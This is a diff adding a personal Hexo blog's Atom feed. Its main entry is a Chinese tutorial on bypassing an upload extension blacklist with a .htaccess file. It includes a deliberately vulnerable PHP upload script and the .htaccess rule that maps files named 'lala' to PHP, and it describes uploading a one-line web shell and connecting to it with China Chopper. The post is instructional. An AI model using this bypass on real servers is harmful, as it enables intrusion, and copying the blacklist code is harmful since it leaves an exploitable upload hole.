@@ -1,0 +1,101 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>xmy&#39;s house</title>
+  <icon>http://yoursite.com/icon.png</icon>
+  <subtitle>Build by xmy</subtitle>
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="http://yoursite.com/"/>
+  <updated>2020-01-13T07:50:00.095Z</updated>
+  <id>http://yoursite.com/</id>
+  
+  <author>
+    <name>小蚂蚁的小窝</name>
+    
+  </author>
+  
+  <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>.htaccess绕过黑名单上传</title>
+    <link href="http://yoursite.com/2020/01/11/htaccess%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95%E4%B8%8A%E4%BC%A0/"/>
+    <id>http://yoursite.com/2020/01/11/htaccess%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95%E4%B8%8A%E4%BC%A0/</id>
+    <published>2020-01-11T10:35:58.000Z</published>
+    <updated>2020-01-13T07:50:00.095Z</updated>
+    
+    <summary type="html">
+    
+      &lt;p&gt;.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。&lt;sup&gt;[1]&lt;/sup&gt;&lt;br&gt;在文件上传使用扩展名黑名单且没有过滤.htaccess的情况下，可以使用.htaccess文件绕过上传限制。&lt;/p&gt;
+&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
+&lt;p&gt;测试上传功能的代码如下：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;meta http-equiv=&amp;quot;content-type&amp;quot; content=&amp;quot;text/html;charset=utf-8&amp;quot;&amp;gt;
+&amp;lt;form action=&amp;quot;&amp;quot; enctype=&amp;quot;multipart/form-data&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt;
+&amp;lt;input type=&amp;quot;file&amp;quot; name=&amp;quot;file&amp;quot; id=&amp;quot;file&amp;quot;&amp;gt;
+&amp;lt;input type=&amp;quot;submit&amp;quot; name=&amp;quot;submit&amp;quot; value=&amp;quot;upload&amp;quot;&amp;gt;
+&amp;lt;/form&amp;gt;
+&amp;lt;?php 
+$black_list = array(&amp;#39;html&amp;#39;, &amp;#39;htm&amp;#39;, &amp;#39;php&amp;#39;, &amp;#39;php2&amp;#39;, &amp;#39;php3&amp;#39;, &amp;#39;php4&amp;#39;, &amp;#39;php5&amp;#39;, &amp;#39;phtml&amp;#39;, &amp;#39;txt&amp;#39;);
+if(isset($_FILES[&amp;#39;file&amp;#39;]))
+{
+    $file_name = $_FILES[&amp;#39;file&amp;#39;][&amp;#39;name&amp;#39;];
+    $file_path = &amp;#39;images/&amp;#39; . $file_name;
+    $file_ext = substr($file_name, strrpos($file_name, &amp;#39;.&amp;#39;)+1);
+    $file_tmp = $_FILES[&amp;#39;file&amp;#39;][&amp;#39;tmp_name&amp;#39;];
+    foreach($black_list as $key=&amp;gt;$value)
+    {
+        if($value == strtolower($file_ext))
+        {
+            echo &amp;quot;不允许上传的文件类型！&amp;quot;;
+            exit(0);
+        }
+    }
+
+    if(!move_uploaded_file($file_tmp, $file_path))
+    {
+        echo &amp;quot;文件上传失败！&amp;quot;;
+    }
+    else
+    {
+        echo &amp;quot;文件上传成功，文件路径为&amp;quot; . $file_path;
+    }
+}
+?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;新建.htaccess文件内容如下：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;FilesMatch &amp;quot;lala&amp;quot;&amp;gt;
+SetHandler application/x-httpd-php
+&amp;lt;/FilesMatch&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;上传该文件，由于文件扩展名不在黑名单中，所以可以上传成功：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/01ud0mg1ecckbsmvfgh0kjzk/1.png&quot; alt=&quot;1.png-24.9kB&quot;&gt;&lt;br&gt;接着上传一个文件名包含“lala”且没有扩展名一句话木马文件：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/tcu7n64hghwlnjpjclc6xeug/2.png&quot; alt=&quot;2.png-25.2kB&quot;&gt;&lt;br&gt;两个文件都能上传成功，使用菜刀连接lala文件：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/jnt9ctkvkwl3e5g62yvlze1k/3.png&quot; alt=&quot;3.png-75.3kB&quot;&gt;&lt;br&gt;所以在使用黑名单过滤且未包含htaccess扩展名的情况下，.htaccess通常是个大杀器。&lt;/p&gt;
+&lt;p&gt;参考：&lt;br&gt;[1]百度百科：&lt;a href=&quot;https://baike.baidu.com/item/htaccess/1645473&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://baike.baidu.com/item/htaccess/1645473&lt;/a&gt;&lt;/p&gt;
+
+    
+    </summary>
+    
+    
+      <category term="文件上传" scheme="http://yoursite.com/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
+    
+    
+      <category term="文件上传" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Hello World</title>
+    <link href="http://yoursite.com/2020/01/11/hello-world/"/>
+    <id>http://yoursite.com/2020/01/11/hello-world/</id>
+    <published>2020-01-11T07:54:24.958Z</published>
+    <updated>2020-01-10T07:21:15.000Z</updated>
+    
+    <summary type="html">
+    
+      &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;documentation&lt;/a&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href=&quot;https://hexo.io/docs/troubleshooting.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;troubleshooting&lt;/a&gt; or you can ask me on &lt;a href=&quot;https://github.com/hexojs/hexo/issues&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
+&lt;h2 id=&quot;Quick-Start&quot;&gt;&lt;a href=&quot;#Quick-Start&quot; class=&quot;headerlink&quot; title=&quot;Quick Start&quot;&gt;&lt;/a&gt;Quick Start&lt;/h2&gt;&lt;h3 id=&quot;Create-a-new-post&quot;&gt;&lt;a href=&quot;#Create-a-new-post&quot; class=&quot;headerlink&quot; title=&quot;Create a new post&quot;&gt;&lt;/a&gt;Create a new post&lt;/h3&gt;&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;$ hexo new &amp;quot;My New Post&amp;quot;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;More info: &lt;a href=&quot;https://hexo.io/docs/writing.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Writing&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&quot;Run-server&quot;&gt;&lt;a href=&quot;#Run-server&quot; class=&quot;headerlink&quot; title=&quot;Run server&quot;&gt;&lt;/a&gt;Run server&lt;/h3&gt;&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;$ hexo server&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;More info: &lt;a href=&quot;https://hexo.io/docs/server.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Server&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&quot;Generate-static-files&quot;&gt;&lt;a href=&quot;#Generate-static-files&quot; class=&quot;headerlink&quot; title=&quot;Generate static files&quot;&gt;&lt;/a&gt;Generate static files&lt;/h3&gt;&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;$ hexo generate&lt;/code&gt;&lt;/pre&gt;
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+</feed>
